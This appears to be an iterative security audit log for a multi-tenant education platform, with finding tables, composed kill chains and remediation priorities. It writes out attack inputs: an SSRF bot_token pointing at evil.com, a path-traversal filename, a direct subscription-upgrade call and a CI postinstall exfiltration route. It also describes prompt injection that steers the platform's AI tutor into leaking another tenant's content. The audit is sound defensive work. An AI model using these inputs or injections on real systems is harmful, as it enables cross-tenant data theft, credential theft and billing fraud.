| # | Severity | Layer | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **HIGH** | Auth (A07) | `routes-auth.ts:99` | `admin.auth.admin.createUser({ ..., email_confirm: true })` marks every signup as already-verified. Combined with auto-join (lines 136-165), **any well-formed-but-unowned email yields an active `student` membership + authenticated JWT** in the first active institution. NO verification flow runs. **Catastrophically agravates iter 3 auth HIGH-2 + chain 1**: attacker doesn't even need a real email to access tenant data. | Set `email_confirm: false`, require Supabase email verification before creating `memberships` row; gate auto-join on verified email or move behind verified-email webhook callback. |
| 2 | **HIGH** | Auth (A07) | dashboard-managed (no `supabase/config.toml` in repo) | NO MFA / TOTP / WebAuthn enforcement evidence anywhere in repo or migrations. Owners can deactivate institutions and rotate memberships with single password factor. | Enable Supabase Auth MFA (TOTP), enforce for any membership with `role IN ('owner','admin')` via Edge-side `aal=aal2` check; commit `supabase/config.toml`. |
| 3 | MEDIUM | Auth (A04) | `routes-auth.ts:43-55` | Signup rate limiter uses **in-memory `Map`** per Edge isolate. Effective limit = `5 × N_isolates / hour`, NOT 5/IP/hour. The distributed table from `20260303000002_distributed_rate_limit.sql` exists and is unused here. | Replace `signupAttempts` Map with existing `rate_limit_entries` table (or RPC the global limiter uses). |
| 4 | MEDIUM | Auth/Privacy (A09/A04) | `routes-auth.ts` (no endpoint) | NO `DELETE /me`, NO data-export endpoint. Only `auth.admin.deleteUser()` is the signup-rollback path. Institution delete is soft. **GDPR/CCPA right-to-erasure + portability not satisfiable in-app.** | Add `DELETE /me` (cascade auth.users + scrub PII) + `GET /me/export` (JSON dump of user-scoped tables). Document retention. |
| 5 | MEDIUM | Auth (A07) | `routes-auth.ts:81` | Password policy = single check `password.length < 8`; max 128. No complexity, no HIBP/breach check, no lockout beyond broken per-IP limiter (#3). | Wire Supabase `password.min_length >= 12` + `required_characters` + HIBP breach check; add account-lockout via `auth.audit_log_entries`. |
| 6 | LOW | Process | `migrations/20260414230000_retrigger_deploy_pipeline.sql` | True no-op (`PERFORM 1`). Comment documents `[migration:destructive-ok]` commit-token bypass of Guard B; misuse risk if reviewers don't enforce. | Restrict bypass token to commits signed by repo owners; log every bypass to audit channel. |

### Migration verified clean
- `DROP FUNCTION IF EXISTS` + `CREATE OR REPLACE` runs inside Supabase's implicit migration transaction (AccessExclusiveLock blocks concurrent callers — they wait, not fail). No downtime window.
- `weekly_reports` `DROP COLUMN ai_strengths/ai_weaknesses`: data migrated JSONB→TEXT[] in temp column then renamed; no user data lost.
- All `DELETE FROM ...` (`rate_limit_entries`, `processed_webhook_events`, `whatsapp_*`, `telegram_*`) are WHERE-scoped cron cleanups. No `TRUNCATE`.
- Anon REVOKE migrations: legitimate anon callers documented as none; service_role grants preserved; `SET search_path = public, pg_temp` applied. CREATE OR REPLACE in `20260404000010` does NOT nullify prior anon REVOKEs (same OID preserves grants).
- Institution DELETE is soft (`is_active=false`); no orphan-cascade risk.
- Tables initially without RLS all gain it later (verified for `student_xp`, `xp_transactions`, `processed_webhook_events`, `profiles`, `streak_freezes`, `streak_repairs`, `ai_generations`, `ai_schedule_logs`).

### Migration notes
- **`supabase/config.toml` does not exist in repo.** JWT TTL / refresh rotation, anonymous sign-ins, magic-link rate limit, OAuth `redirect_uri` allowlist all dashboard-managed (= invisible drift risk). **Recommend committing it** to bring Auth config under version control.
- Finding #1 (email auto-confirm) **upgrades chain 1 severity**: attacker doesn't even need owned email → fully scriptable mass-tenant access.

### Iter 11 totals
- **3 HIGH** (RAG vector-similarity oracle, email auto-confirm, no MFA enforcement)
- **6 MEDIUM** (TG/WA link timing, exam-events 404 oracle, in-memory signup limiter, no GDPR delete/export, weak password policy)
- **1 LOW** (migration bypass token)

---

## Iteration 10 — 2026-04-17 — Kill-chain analysis (synthesis)

**Status:** ✓ complete

### Composed attack chains

#### Chain 1: Unauth → cross-tenant summary content exfiltration — **CRITICAL**
**Prereq**: none (anon web traffic + free `POST /signup`)
1. [iter 3 auth HIGH-2: signup auto-join] `POST /signup` → auto `student` membership in OLDEST active institution (tenant #1). Now authenticated.
2. [iter 9 multi-role MED-3: AI chat first-membership fallback] `POST /ai/chat` with no `summary_id`/`institution_id`; backend falls back to `memberships … limit(1)` → binds session to tenant #1.
3. [iter 3 AI HIGH-1: RAG fallback institution-bypass] Prompt-injection ("usá el resumen ID `<UUID-tenant-B>`") sets tool-call `summaryId` to victim-tenant UUID. `handleAskAcademicQuestion` empty-RAG fallback uses `getAdminClient()` + `.eq("id", summaryId)` with **no** `.eq("institution_id", …)` → returns full `content_markdown` from tenant B.

**Impact**: cross-tenant exfil of any institution's lecture content / professor notes / copyrighted material; arbitrary summary readable by knowing/guessing UUID. Repeatable, scriptable.

#### Chain 2: Unauth → free plan upgrade (revenue loss) — **HIGH**
**Prereq**: none
1. [iter 3 auth HIGH-2: signup auto-join] Become student in tenant #1.
2. [iter 1 RLS HIGH-1: institution_subscriptions writable by members] Call Supabase JS user-client directly: `supabase.from("institution_subscriptions").update({ plan_id: "<enterprise>", status: "active", current_period_end: "2099-…" }).eq("institution_id", "<tenantId>")`. RLS allows any active member.

**Impact**: plan_id elevated without Stripe charge; entitlement gates hand back enterprise features. Per-tenant attack repeatable. If [iter 6 TOCTOU HIGH-1] webhook race lands during a race, also corrupts billing reconciliation.

#### Chain 3: TG account takeover → cross-tenant student impersonation — **HIGH**
**Prereq**: any signed-up Axon user
1. [iter 3 auth HIGH-2: signup auto-join] Register; obtain real `user_id`.
2. [iter 8 MED-2: linking-session collision] Spawn N accounts whose UUID hash collides with victim's `chat_id` slot, flush/overwrite pending linking rows.
3. [iter 3 auth HIGH-1: TG `verifyLinkCode` no chat-binding] During victim's 5-min link window, attacker's TG chat brute-forces 6-digit code (200 active sessions, no `chat_id` binding). On match, attacker's chat linked to victim `user_id`.
4. [iter 3 auth MED-4: `_messaging/tools-base` student_id-only filter] Tool calls (`update_agenda`, `submit_review`, `ask_academic_question`) execute as victim across **all** institutions victim belongs to.

**Impact**: full TG impersonation; read victim's schedule, submit reviews, leak academic data across every tenant.

#### Chain 4: Fork PR → OPENAI_API_KEY exfiltration → bot-net abuse — **CRITICAL**
**Prereq**: GitHub account, ability to open a PR (anyone)
1. [iter 4 CI HIGH-1: pr-opened-review.yml runs untrusted PR with secrets] Open PR adding malicious `package.json` `postinstall` script.
2. [iter 4 LOW-MED #5: `npm ci` runs install scripts on PR jobs] Postinstall fires under `OPENAI_API_KEY` env; exfil over DNS/HTTP to attacker host.

**Impact**: stolen OPENAI_API_KEY (+ any env-mounted secret); third-party billing fraud; reputational compromise; pivot to repo write via cache poisoning.

#### Chain 5: Malicious PDF → cross-tenant client compromise + RAG poisoning — **HIGH**
**Prereq**: signed-up user with content-write role in any tenant (chain 7 + role escalation gets there)
1. [iter 5 file HIGH-2: ingest-pdf path-traversal filename] Upload `../../../<victim-inst>/<victim-summary>/poison.pdf` — null-byte/RTL-override variants land in arbitrary storage path.
2. [iter 5 file HIGH-3: no PDF active-content sanitization] PDF carries `/JavaScript` + `/OpenAction` payload + crafted text-layer prompt-injection blocks.
3. [iter 3 AI MED-3 / MED-4: prompt injection via title/topic] Hostile text steers Gemini extraction + downstream summary/voice tutor outputs.

**Impact**: students/professors downloading the PDF execute attacker JS in PDF.js/Reader; AI assistant emits attacker-controlled content (defacement, phishing, credential prompts) inside trusted Axon UI.

#### Chain 6: Multi-institution admin → SSRF → WhatsApp access_token theft — **HIGH**
**Prereq**: admin/owner role in 2+ institutions (insider or compromised admin account)
1. [iter 1 backend HIGH-1: messaging-admin confused-deputy] `getUserInstitution()` arbitrary first-membership lets attacker target the WRONG institution's messaging credentials.
2. [iter 1 backend HIGH-2: SSRF via stored bot_token / phone_number_id] Inject `bot_token = "123:abc@evil.com/x?"` so URL parser routes verification call to attacker host — leaks `Authorization: Bearer <whatsapp_access_token>` in fetch headers.

**Impact**: theft of victim institution's Meta `access_token`; attacker can send WhatsApp as victim brand to all linked students (phishing, fraud, regulator-grade incident).

#### Chain 7: Wallet/resource DoS — **MEDIUM**
**Prereq**: none (signup auto-join)
1. [iter 3 auth HIGH-2: signup auto-join] Get authenticated.
2. [iter 6 rate-limit HIGH-1: `/upload-model-3d` no per-user cap] Upload 100 MB GLBs at 300/min → ~30 GB/min/user storage burn.
3. [iter 7 SSE MED-1: stream cost runaway] Open & abort `POST /ai/chat` SSE in tight loop; Anthropic keeps streaming → bills tenant's quota.

**Impact**: storage cost explosion, AI quota exhaustion, denial of service to legitimate users.

---

### 🎯 Risk-prioritized fix order (Pareto — fix these 5 → break ~all chains)

| # | Finding | Chains broken | Effort |
|---|---|---|---|
| 1 | **iter 3 auth HIGH-2** (signup auto-join) | 1, 2, 3, 7 + gateway to 5 | trivial — env flag or invite-token gate |
| 2 | **iter 3 AI HIGH-1** (RAG fallback institution filter) | 1 (defense-in-depth) | small — add `.eq("institution_id", ...)` line |
| 3 | **iter 1 RLS HIGH-1** (`institution_subscriptions` writable) | 2 at DB layer | small — drop members write policies, force admin client |
| 4 | **iter 4 CI HIGH-1** (PR job + OPENAI_API_KEY) | 4 entirely | trivial — `if: github.event.pull_request.head.repo.full_name == github.repository` gate or split into trusted/untrusted jobs |
| 5 | **iter 3 auth HIGH-1** (TG `verifyLinkCode` chat-binding) | 3 at link primitive (8 MED-2 + 3 MED-4 become moot without the 6-digit hijack) | small — bind code to single submitting `chat_id` |

**Honorable mentions** (single finding kills entire chain):
- iter 5 HIGH-2 + HIGH-3 (ingest-pdf hardening) → kills chain 5
- iter 1 backend HIGH-1 + HIGH-2 (messaging-admin hardening) → kills chain 6

### 🔥 Compounded findings (force multipliers)

- **iter 3 auth HIGH-2 (signup auto-join)** — appears in **4 chains** (1, 2, 3, 7) + on-ramp for 5. **Single dominant multiplier**. Fix this first or every other fix is only defense-in-depth.
- **"First-active-membership" anti-pattern** (class: iter 1 backend HIGH-1 + iter 9 MED-2 + iter 9 MED-3) — appears across chains 1, 6, and as latent amplifier. Worth codebase-wide sweep banning `memberships … limit(1)` without explicit `institution_id`.
- No other single finding hits 3+ threshold — honest answer: **iter 3 auth HIGH-2 alone dominates the risk surface**.

---

# 📊 Executive Summary — 8 iterations

| Iter | Surface | HIGH | MED | LOW | New |
|---|---|---:|---:|---:|---:|
| 1 | Backend RLS + general security | 4 | 6 | 1 | 11 |
| 2 | Frontend XSS/CSRF | 0 | 1 | 0 | 1 |
| 3 | AI/LLM + auth flow | 3 | 6 | 0 | 9 |
| 4 | CI/CD supply chain + deps | 1 | 6 | 3 | 10 |
| 5 | HTTP headers + file uploads | 3 | 4 | 0 | 7 |
| 6 | TOCTOU + rate-limit + logging | 2 | 7 | 1 | 10 |
| 7 | CRUD validation + Realtime | 0 | 6 | 3 | 9 |
| 8 | Outbound notifications | 0 | 2 | 0 | 2 |
| **Σ** | | **13** | **38** | **8** | **59** |

## Top 5 most actionable HIGH (priority remediation queue)

1. **#447 already fixed (`4fced961`)** — open redirect via backslash. Leaving here for paper-trail.
2. **Iter 1 backend HIGH-1**: `messaging-admin.ts` confused-deputy — multi-inst admin can't pick which inst to administer; ordering bug leaks/overwrites credentials. → Require `institution_id` in path/body + `requireInstitutionRole`.
3. **Iter 1 backend HIGH-2 / Iter 8 dup**: SSRF via admin-stored `bot_token`/`phone_number_id`. → Validate token shape regex + `new URL()` host assert before fetch. Most exposed: `Authorization: Bearer ${access_token}` to attacker host.
4. **Iter 1 RLS HIGH-1**: `institution_subscriptions` writable by any active member (incl. students) at DB layer. App-layer guard exists but `routes/plans/access.ts:110` uses user client. → Drop members write policies; force admin client for all billing writes.
5. **Iter 3 AI HIGH-1**: `handleAskAcademicQuestion` fallback bypasses institution filter via admin client + LLM-poisoned `summaryId` → cross-tenant content leak.
6. **Iter 3 auth HIGH-1**: Telegram `verifyLinkCode` 6-digit code with no `chat_id` binding — link hijack via code-collision race + chat rotation.
7. **Iter 3 auth HIGH-2**: `POST /signup` auto-joins every new user as `student` to OLDEST active institution → multi-tenant priv-esc.
8. **Iter 4 CI HIGH-1**: `pr-opened-review.yml` runs untrusted PR code with `OPENAI_API_KEY` mounted → secret exfil via post-install script.
9. **Iter 5 file HIGH-1**: `/storage/upload` polyglot risk — no magic-byte verification; HTML/SVG masquerading as image stored in public bucket.
10. **Iter 5 file HIGH-2**: `/ai/ingest-pdf` path-traversal in storage key (filename not sanitized).
11. **Iter 5 file HIGH-3**: `/ai/ingest-pdf` no PDF active-content sanitization.
12. **Iter 6 TOCTOU HIGH-1**: Stripe webhook idempotency = SELECT-then-INSERT race → double-processed events.
13. **Iter 6 rate-limit HIGH-1**: `/upload-model-3d` no per-user cap → 30 GB/min/user.

(Numbered 1-13; #1 is already fixed in PR #447.)

## Surfaces NOT covered (potential future iters)

- Subdomain takeover / DNS misconfig
- Email channel security (when added)
- Supabase Auth password policy / MFA configuration
- Database backup / dump exposure
- Browser fingerprinting / side-channels (timing, XS-Leaks)
- Mobile/native app (if any planned)
- Privilege boundary tests between professor/admin/owner (partial in iter 3)
- pg_dump / migration history exposure
- Backend OpenTelemetry / metrics endpoints (if added)

## Loop status

Loop paused after iter 8 — ROI dropping (iter 7 + 8 had 0 HIGH; iter 8 had 1 duplicate). No `ScheduleWakeup` set. To resume: invoke `/loop busncado fallas de seguridad en el codigo` again.

---

## Iteration 7 — 2026-04-17 — CRUD validation + Realtime/WS

**Status:** ✓ complete (Realtime/WS + CRUD validation)

### Realtime / WebSocket / SSE (security-scanner)

| # | Severity | Layer | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | Backend SSE | `routes/ai/chat.ts:436-499` | **Stream cost runaway on client disconnect.** `ReadableStream` declares only `start(controller)` — no `cancel()`. No `AbortController`/`AbortSignal` threaded into `generateTextStream`. When SSE client drops, `controller.enqueue()` throws on next write, inner catch runs, but upstream Anthropic `reader` is never released and HTTP request not aborted. Anthropic keeps streaming tokens until it closes connection itself, billed against user. Cheap DoS-the-wallet vector (start, abort, repeat). OWASP A04 cost abuse. | Add `cancel(reason)` to ReadableStream init that calls `reader.cancel()` + `AbortController` whose `.signal` is passed to `generateTextStream`. Detect `c.req.raw.signal.aborted` between chunk writes. |

### Realtime/WS verified clean
- Ephemeral token is server-derived (`realtime-session.ts:406-412` reads `client_secret` from OpenAI response only; request to OpenAI doesn't forward client-supplied token).
- Token storage ephemeral: `as-realtime.ts:120` consumes as function param; `useRealtimeVoice.ts:208-237` keeps in local const + discards. Zero `localStorage`/`sessionStorage`/`IndexedDB` writes.
- Token NOT in URL: secret rides WebSocket subprotocol header (`'openai-insecure-api-key.${clientSecret}'`), not query string. OpenAI's documented pattern. No referer/proxy-log leak.
- No replay: `useRealtimeVoice.startCall` calls `createRealtimeSession` fresh on every press.
- Mux signing key server-side; client only fetches playback/thumbnail/storyboard tokens via `/mux/playback-token`.
- SSE proxy buffering: `Cache-Control: no-cache`, `Connection: keep-alive`, `X-Accel-Buffering: no`.
- Realtime-session rate-limit fail-closed in primary check (10/hour/user).

### Realtime/WS notes
- **WebRTC NOT used** — frontend uses raw WebSocket. Earlier WebRTC concerns (ICE servers, SDP injection, DataChannel) N/A.
- **Supabase Realtime NOT used** by app. Zero `supabase.channel(` / `postgres_changes` calls. Cross-tenant Realtime risk N/A.
- Token TTL OpenAI-controlled (~60s default per comment, actual `expires_at` from OpenAI).
- Voice bucket fail-open (`SEC-NOTE`-annotated, accepted iter 3).
- SSE error events forward raw exception messages to client (would only leak Anthropic SDK internals — low, flagged for future iteration not reported now).

### CRUD validation (security-scanner)

| # | Severity | Endpoint | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | `PUT /algorithm-config` | `routes/settings/algorithm-config.ts:153-178` | `Number(body.x)` coerces non-numeric to `NaN`. `Math.abs(NaN - 1.0) >= 0.02` evaluates `false`, so weight-sum and BKT constraint guards silently bypassed; `NaN` upserted into `algorithm_config`, corrupting scheduling institution-wide. | Validate each weight with `isNum` / `inRange(x, 0, 1)` from `validate.ts` BEFORE `Number(...)`. Reject on invalid; don't rely on `Math.abs` with potential NaN. |
| 2 | MEDIUM | `POST /mux/track-view` | `routes/mux/tracking.ts:39-44, 99` | Boolean coercion: `const { completed = false } = body` applies default only when key undefined. `{completed:"false"}` reaches `isFirstCompletion = completed && ...` as truthy string → triggers first-completion XP award + BKT signal. Grindable per-student. Plus `watch_time_seconds`/`completion_percentage`/`last_position_seconds` accepted without numeric validation. | `if (!isBool(body.completed)) return err(...)`; validate numerics with `isNonNeg` / `inRange(0,100)` before RPC. |
| 3 | MEDIUM | `POST /institutions`, `PUT /institutions/:id` | `routes/members/institutions.ts:59, 158` | `settings` JSONB copied verbatim with only `typeof === "object"` check. No depth/key/size cap → JSON bomb consumed by PostgREST JSONB parsing. | `isBoundedJson(v, {maxDepth:6, maxKeys:100, maxBytes:16_000})` helper; reject oversize with 413. |
| 4 | MEDIUM | `POST /kw-prof-notes` | `routes/content/prof-notes.ts:107-110` | `note` accepted with `typeof === "string"` but no length cap. Attacker stores arbitrarily large string (limited only by Hono body parser), consumes row storage + propagates to clients. | Add `MAX_NOTE_LENGTH = 20_000` (match `sticky-notes.ts` pattern); reject 400 on overflow + empty-string. |
| 5 | MEDIUM | `PUT /settings/messaging/:channel` | `routes/settings/messaging-admin.ts:156-187` | `settings` object deep-merged with existing JSONB without depth/key cap. Distinct from iter 1 #4 (mass-assignment): here the JSONB-shape itself is unbounded. Admin-gated but multi-tenant shared storage. | Same bounded-JSON helper as #3; enforce per-channel key allowlist (whatsapp: [`access_token`,`phone_number_id`,...]). |

### CRUD validation verified clean
- `crud-factory.ts`: explicit `createFields`/`updateFields` allowlist loop drops unknown keys; `parsePagination` caps LIMIT at 500, OFFSET ≥0, NaN→default; `:id` parameterized to PostgREST.
- Batch endpoints all cap arrays + loop-check UUIDs: subtopics-batch (50), keyword-connections-batch (50), bkt-states subtopic_ids (200), review-batch (MAX_BATCH_SIZE), reorder (200), topics-overview (50), ai/suggest-student-connections (MAX_NODE_IDS).
- `POST /sticky-notes` (20KB cap), `exam-events`, `finals-periods`, `reading-states`, `reviews` (isBool), `quiz-attempts`, `fsrs-states`/`bkt-states` POST (probability + isIsoTs + isNonNegInt via `validateFields`) — uniform `validate.ts` use.
- **No `new RegExp(userInput)` in codebase** (only `prompt-sanitize.ts:19` with constant tag name).
- `isIsoTs` rejects invalid dates via `!isNaN(Date.parse(v))`; `isDateOnly` requires `YYYY-MM-DD` regex.

### CRUD notes
- LOW: `schedule-agent.ts:607-608` and `weekly-report.ts:53` use `Math.min(parseInt(q),200)` — `?limit=abc` → NaN to `.range()`, PostgREST 500. Replace with `parsePagination`.
- LOW: `keyword-connections.ts:207-209` checks `keyword_a_id`/`keyword_b_id` as strings only (saved by RPC typed param); `relationship` no length cap.
- LOW: `ai/chat.ts:160-165` truncates history turn chars but doesn't cap overall `history` array length before slice.

### Iter 7 totals
- **0 HIGH**
- **6 MEDIUM** (5 CRUD + 1 SSE cost runaway)
- **3 LOW**

---

## Iteration 6 — 2026-04-17 — TOCTOU + rate-limit + logging hygiene

**Status:** ✓ complete (rate-limit + logging + TOCTOU)

### Rate-limiting (security-scanner)

| # | Severity | Route | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | `POST /upload-model-3d` | `routes-models.ts:234-260` | 100 MB cap per file under only the global 300/min/user bucket = up to ~30 GB/min/user bandwidth + storage write to `axon-models-3d`. Auth verifies institution membership but not abuse rate. | Per-user `check_rate_limit` bucket (e.g. 10 uploads/hour). Fail-closed on RPC error like `routes/ai/index.ts:107-110`. |
| 2 | MEDIUM | `POST /storage/upload` | `routes-storage.ts:57-191` | 5 MB × 300/min global = ~1.5 GB/min/user bandwidth. No per-user upload quota. | Dedicated bucket (e.g. 60/hour). |
| 3 | MEDIUM | `POST /billing/checkout-session`, `POST /billing/portal-session` | `routes/billing/index.ts:29,80` | Authenticated user can fire ~300 Stripe Checkout/Portal session creations per minute. Stripe API quota burn + DB lookups + log noise. | `check_rate_limit` bucket (e.g. 20/hour/user) on both. |

### Logging hygiene (security-scanner)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | MEDIUM | `routes/calendar/fsrs-calendar.ts:40` | `return err(c, ` `Workload RPC failed: ${error.message}` `, 500)` — raw Postgres/RPC error string returned (table names, hint text). Bypasses `safeErr`. | `safeErr(c, "Workload calendar", error)`. |
| 2 | MEDIUM | `routes/calendar/fsrs-calendar.ts:61` | Same: `Timeliness RPC failed: ${error.message}`. | `safeErr(c, "Timeliness calendar", error)`. |
| 3 | MEDIUM | `routes/content/keyword-connections-batch.ts:154` | `Batch keyword-connections failed: ${error.message}` echoed — leaks PostgREST detail (column, constraint). | `safeErr(c, "Batch keyword-connections", error)`. |

### Rate-limit/logging verified clean
- `POST /signup`: dedicated per-IP bucket 5/hour (`routes-auth.ts:43-55`); password capped at 128.
- Password-reset + login: handled by Supabase Auth gateway (`/auth/v1/*`) — out of scope.
- Stripe / WhatsApp / Telegram webhooks: timing-safe HMAC + idempotency + per-chat/phone buckets.
- AI 100/hour + voice 10/hour fail-closed.
- Global rate limiter is per-user (JWT `sub`) when auth, falls back to per-IP via `x-forwarded-for` unauth.
- **NO `Authorization`/`Bearer`/`password`/`secret`/`client_secret`/`api_key`/`refresh_token` in any `console.*` call across backend** — token logging audit is clean.
- No request-body dumps; no email addresses logged for signup/reset (only userId UUID).
- No IPs written to logs — only in-memory as rate-limit map keys, no persistence.
- No Sentry / external telemetry sink.
- `safeErr` consistently used across CRUD factory, members, content, mux, ai, study.
- `realtime-session.ts:435-436` logs stack trace server-side only; client gets generic Spanish message.

### Rate-limit/logging notes
- Per-IP signup bucket trusts `x-forwarded-for`; on Supabase Edge the gateway sets this. Not a finding unless gateway changes.
- `realtime-session.ts:410` logs `JSON.stringify(session).slice(0,300)` only on missing-clientSecret branch — LOW, no valid token in payload at that point.

### TOCTOU + advisory locks (security-scanner)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | HIGH | `routes/billing/webhook.ts:46-61, 86-94, 169-178` | Stripe webhook idempotency = SELECT-then-process-then-INSERT. Two parallel deliveries of same `event.id` (legitimate Stripe retry) both pass `maybeSingle()` guard before either INSERTs `processed_webhook_events`. Result: `institution_subscriptions.insert` runs twice, `memberships.institution_plan_id` updated twice. Unique index on `(event_id, source)` only blocks the second INSERT *after* processing ran. **No `UNIQUE(stripe_subscription_id)` on `institution_subscriptions`** found in migrations — duplicate rows unconstrained. | Invert order: `INSERT processed_webhook_events ON CONFLICT (event_id, source) DO NOTHING RETURNING id` first; only execute side-effects if a row was inserted. Add `UNIQUE(stripe_subscription_id)` as defense-in-depth. |
| 2 | MEDIUM | `auto-ingest.ts:176-178, 528-530`; `gamification-dispatcher.ts:92-94, 139-141`; `routes/gamification/streak.ts:153, 258, 295, 393` | Wrappers call `pg_try_advisory_lock` (session-scoped), not `pg_try_advisory_xact_lock`. With supavisor in transaction-pool mode (port 6543), the unlock RPC can land on a different pooled connection — leaving lock held until original backend dies. Unlock RPCs wrapped in `.catch(() => {})` swallow failure silently → progressive lock leaks → `try_advisory_lock` returns false for that key forever → silent feature degradation (badge eval skipped, freeze/repair 409, auto-ingest "skipped_locked"). | Switch to `pg_try_advisory_xact_lock` + `BEGIN/COMMIT` in single SECURITY DEFINER fn (auto-release at txn end). If session semantics required, document use of session-pool port (5432) and remove silent `.catch`. |
| 3 | MEDIUM | `auto-ingest.ts:197-525` | Advisory lock held across `generateEmbeddings` (line 412) + per-chunk UPDATE loop (433-448) — both N×network-bound awaits. 50-chunk summary easily >30s under lock. Concurrent edits return `skipped_locked` for duration → user's most recent edit may never be re-ingested if it loses race repeatedly. | Acquire lock just before DELETE/INSERT of chunks; release before embed loop. Re-check `content_hash` after re-acquire if embed must be inside lock. Or queue ingest jobs (idempotent on summary_id). |
| 4 | LOW | `auto-ingest.ts:109-115`; `gamification-dispatcher.ts:35-43` | Different hash functions (DJB2-like vs FNV-1a) for advisory lock keys → 32-bit space, ~50% collision at ~77k keys (birthday). Real impact low (missed dispatch). | Namespace keys per use-case (e.g., `(0xA1 << 32) \| hash`) so auto-ingest and post-eval cannot collide. |

### TOCTOU verified clean
- `routes/search/trash-restore.ts:153-159` — UPDATE with `.eq("id",id).not("deleted_at","is",null)` atomic precondition; soft-delete-then-link race n/a.
- `routes/gamification/goals.ts:55-67` — `upsert({ onConflict: "student_id,institution_id" })`. Correct.
- `routes/gamification/goals.ts:111-125` — duplicate-claim guard + awardXP; `xp_transactions.source_id` provides eventual-consistency safety.
- `routes/gamification/streak.ts` — primary path is atomic `buy_streak_freeze` RPC; JS fallback wrapped in advisory lock + compensating UPDATE on insert error.
- `routes/members/memberships.ts:170-212` — last-owner / role-hierarchy guard. Race window exists (count then UPDATE) but worst case = transient "no owner" recovered by `MANAGEMENT_ROLES` checks on next request.
- `gamification-dispatcher.ts:302-335` — `_tryAwardBadge` uses fresh-check + 23505 catch. Correct.
- Stripe webhook signature: `timingSafeEqual`. Clean.

### TOCTOU notes
- Finding #1 severity assumes no DB-level UNIQUE on `institution_subscriptions.stripe_subscription_id`. If added via dashboard outside migration files, downgrade to MEDIUM.
- Finding #2 conditional on supavisor pool mode. Default Supabase Edge clients connect to session-pool (port 5432) → leak unlikely in production but easy to regress when someone switches the pool URL.
- Stripe checkout-tab-close race (task item): not exercised — frontend success page doesn't write subscription state directly; webhook is source of truth.
- Auto-ingest debounce: there is no debounce — `summary-hook.ts:91` fires on every relevant write. Advisory lock is the only collapsing mechanism; subsequent fires within lock return `skipped_locked` (see #3).
- `UPDATE … RETURNING *`: no auth decisions depend on post-update SELECT data — all routes re-derive auth from `user.id` and re-check via `requireInstitutionRole`. Clean.

### Iter 6 totals
- **2 HIGH** (Stripe webhook race, /upload-model-3d unbounded)
- **7 MEDIUM** (3 logging, 2 rate-limit, advisory pool, auto-ingest lock duration)
- **1 LOW** (hash collision risk)

---

## Iteration 5 — 2026-04-17 — HTTP headers + file uploads

**Status:** ✓ complete (headers + uploads)

### HTTP security headers (security-scanner)

| # | Severity | Layer | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | Backend (Hono) | `server/index.ts:97-102` (+ all of `routes-auth.ts`) | Auth-sensitive responses (`/me`, `/auth`, `/membership`) emit no `Cache-Control`. Global middleware sets only nosniff/XFO/HSTS. Browsers/intermediaries may cache user-identity payloads. OWASP A02. | Add `c.header("Cache-Control","no-store")` (+ `Pragma: no-cache`) in middleware scoped to auth/profile/membership/billing routes, or unconditionally in `authenticate()`. |
| 2 | MEDIUM | Frontend + Realtime | `frontend/vercel.json:9-26`; `routes/ai/realtime-session.ts` | No `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` anywhere. Realtime audio (WebRTC + `wss://api.openai.com`) exposed to XS-Leaks via `window.opener` and cross-origin embedding. | Add `Cross-Origin-Opener-Policy: same-origin` to `vercel.json` and `public/_headers`. Consider `COEP: require-corp` for full cross-origin isolation (verify Mux/OpenAI send `CORP` headers first). |

### Headers verified clean
- `script-src` has NO `'unsafe-inline'` and NO `'unsafe-eval'` (only `style-src` carries `'unsafe-inline'`).
- `'unsafe-eval'` absent from every CSP variant.
- CORS in `index.ts:50-94` uses explicit allowlist + anchored Vercel preview regex; never `*`. `allowHeaders` is explicit list (`Content-Type`, `Authorization`, `X-Access-Token`).
- HSTS: frontend `max-age=63072000; includeSubDomains; preload` (2yr); backend `max-age=31536000; includeSubDomains` (1yr — acceptable on `*.supabase.co`).
- `X-Content-Type-Options: nosniff` + `X-Frame-Options: DENY` on both layers.
- `Referrer-Policy: strict-origin-when-cross-origin` on frontend.
- `Permissions-Policy: camera=(), microphone=(self), geolocation=()` — correct (Realtime needs mic).
- `connect-src` allowlists Supabase REST+WSS and OpenAI REST+WSS. Anthropic/Google live behind backend, not browser.
- `frame-src 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `worker-src 'self' blob:`.
- No `Set-Cookie` in backend — fully stateless / Bearer-token.

### Headers notes
- `style-src 'unsafe-inline'` in `vercel.json:22` + `_headers:8` justified by `chart.tsx` `<style dangerouslySetInnerHTML>` (per DECISION-AUDIT-LOG); confirmed open from iter 3, not re-reported.
- `frame-ancestors 'none'` missing from CSP but `X-Frame-Options: DENY` covers; recommend adding for defense-in-depth on modern browsers (CSP supersedes XFO).
- `frontend/.../sidebar.tsx:86` writes `document.cookie` (`sidebar_state`, UI preference) without `Secure`/`SameSite`. LOW informational.
- `index.html` has no `<meta http-equiv>` — correct (real headers at Vercel edge).

### File upload security (security-scanner)

| # | Severity | Endpoint | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | `POST /storage/upload` | `routes-storage.ts:82-88, 107-113, 160` | Polyglot risk. Allowlist checks `file.type` (multipart Content-Type, attacker-controlled) and `body.mimeType`. NO magic-byte verification. Bytes stored with client-declared `contentType`. HTML/SVG masquerading as `image/jpeg` passes, served from public `axon-images` bucket under attacker-influenced Content-Type. No `Content-Disposition: attachment` on signed URLs. | Sniff first 8-12 bytes server-side (jpeg `FF D8 FF`, png `89 50 4E 47`, webp `RIFF...WEBP`); reject mismatches. Add `Content-Disposition: attachment` for non-image responses; re-encode images via wasm-imagemagick or `sharp` to strip EXIF/embedded scripts. |
